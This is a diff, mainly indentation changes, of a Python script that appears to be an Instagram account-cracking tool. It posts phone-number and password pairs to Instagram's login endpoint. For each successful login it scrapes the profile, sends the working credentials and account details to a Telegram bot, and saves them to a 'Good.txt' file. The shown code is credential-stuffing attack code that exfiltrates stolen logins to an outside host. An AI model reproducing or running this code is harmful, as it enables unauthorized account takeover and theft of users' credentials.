@@ -137,10 +137,10 @@ def hamwy():
                     'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1613414957:dsbvhdbvdsvbsdh',
                     'queryParams': '{}',
                     'optIntoOneTap': 'false'}
-                req = requests.post(url_checker, data=data_checker, headers=headers_checker).text
-                if '"user":false' in req:
-				url_get_info = 'https://www.instagram.com/accounts/edit/?__a=1'
-				headers_get_info = {
+				req = requests.post(url_checker, data=data_checker, headers=headers_checker).text
+				if '"user":false' in req:
+					url_get_info = 'https://www.instagram.com/accounts/edit/?__a=1'
+					headers_get_info = {
                         'accept': '*/*',
                         'accept-encoding': 'gzip, deflate, br',
                         'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
@@ -152,34 +152,33 @@ def hamwy():
                         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
                         'x-ig-app-id': '936619743392459',
                         'x-ig-www-claim': 'hmac.AR3P8eA45g5ELL3lqdIm-DHKY2MSY_kGWkN0tGEwG2Ks9Ncl',
-                        'x-requested-with': 'XMLHttpRequest'
-                    }
-				data_get_info = {
+                        'x-requested-with': 'XMLHttpRequest'}
+					data_get_info = {
                         '__a': '1'
                     }
-				req_get_info = requests.get(url_get_info, data=data_get_info, headers=headers_get_info)
-				username = str(req_get_info.json()['form_data']['username'])
-				url = f"https://www.instagram.com/{username}?hl=en"
-				r = requests.get(url,headers = {'User-agent': 'your bot 0.1'}).text
-				s = requests.get(url,headers = {'User-agent': 'your bot 0.1'})
-				soup = BeautifulSoup(r,'html.parser')
-				meta = soup.find("meta")
-				name = soup.find("meta", property="og:title")
-				name = name["content"].split("(")[0]
-				link_url = soup.find("meta", property="og:url")
-				profile_pic = soup.find("meta", property="og:image")
-				description = soup.find("meta", property="og:description")
-				followers = description["content"].split(",")[0]
-				following = description["content"].split(",")[1]
-				posts = description["content"].split(",")[2].split("-")[0]
-				s=(f"================================\n  Number: +"+username_login+"\n  Pass: "+password_login+"\n  UserName: "+username+"\n  Name: "+name+"\n  Followers: "+followers+"\n  Following: "+following+"\n  Posts: "+posts+"\n  Facebook: nazanm\n  Tiktok: nazanm\n================================")
-				requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={s}\n')
-				os.system("clear")
-				print(logo2)
-				hits+=1
-				print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
-				with open("/sdcard/Good.txt", "a") as ss:
-					ss.write(username_login+":"+password_login)
+					req_get_info = requests.get(url_get_info, data=data_get_info, headers=headers_get_info)
+					username = str(req_get_info.json()['form_data']['username'])
+					url = f"https://www.instagram.com/{username}?hl=en"
+					r = requests.get(url,headers = {'User-agent': 'your bot 0.1'}).text
+					s = requests.get(url,headers = {'User-agent': 'your bot 0.1'})
+					soup = BeautifulSoup(r,'html.parser')
+					meta = soup.find("meta")
+					name = soup.find("meta", property="og:title")
+					name = name["content"].split("(")[0]
+					link_url = soup.find("meta", property="og:url")
+					profile_pic = soup.find("meta", property="og:image")
+					description = soup.find("meta", property="og:description")
+					followers = description["content"].split(",")[0]
+					following = description["content"].split(",")[1]
+					posts = description["content"].split(",")[2].split("-")[0]
+					s=(f"================================\n  Number: +"+username_login+"\n  Pass: "+password_login+"\n  UserName: "+username+"\n  Name: "+name+"\n  Followers: "+followers+"\n  Following: "+following+"\n  Posts: "+posts+"\n  Facebook: nazanm\n  Tiktok: nazanm\n================================")
+					requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={s}\n')
+					os.system("clear")
+					print(logo2)
+					hits+=1
+					print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+					with open("/sdcard/Good.txt", "a") as ss:
+						ss.write(username_login+":"+password_login)
 		else:
 			os.system("clear")
 			print(logo2)
